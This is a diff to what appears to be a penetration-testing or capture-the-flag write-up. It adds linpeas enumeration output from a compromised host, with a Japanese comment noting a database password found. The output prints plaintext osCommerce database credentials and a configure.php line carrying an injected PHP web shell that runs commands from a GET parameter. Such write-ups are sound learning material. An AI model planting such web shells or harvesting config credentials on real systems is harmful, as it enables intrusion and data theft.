@@ -96,6 +96,28 @@ uid=1000(milan) gid=1000(milan04) groups=1000(milan04),4(adm),24(cdrom),27(sudo)
 ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files       
 var/www/html/froxlor/lib/Froxlor/Database/Database.php
+
+╔══════════╣ Backup folders
+/var/www/html/oscommerce/catalog/admin/backups
+
+╔══════════╣ Backup files (limited 100)
+
+-rwxr-xr-x 1 www-data www-data 21903 Aug 18  2017 /var/www/html/oscommerce/catalog/admin/backup.php
+
+# DBのパスワードらしきものを発見
+╔══════════╣ Searching passwords in config PHP files
+/var/www/html/froxlor/admin_configfiles.php:            '<SQL_UNPRIVILEGED_PASSWORD>' => 'FROXLOR_MYSQL_PASSWORD',                                          
+/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_DATABASE', 'oscdb');
+/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_SERVER_PASSWORD', '7NVLVTDGJ38HM2TQ');
+/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_SERVER_USERNAME', 'oscuser');
+/var/www/html/oscommerce/catalog/includes/configure.php:  define('DB_DATABASE', 'oscdb');
+/var/www/html/oscommerce/catalog/includes/configure.php:  define('DB_SERVER_PASSWORD', '7NVLVTDGJ38HM2TQ');
+/var/www/html/oscommerce/catalog/includes/configure.php:  define('DB_SERVER_USERNAME', 'oscuser');
+/var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_DATABASE', '');echo system($_GET["cmd"]);/*');
+/var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_SERVER_PASSWORD', '');
+/var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_SERVER_USERNAME', '');
+
+
 ```
 
 ---
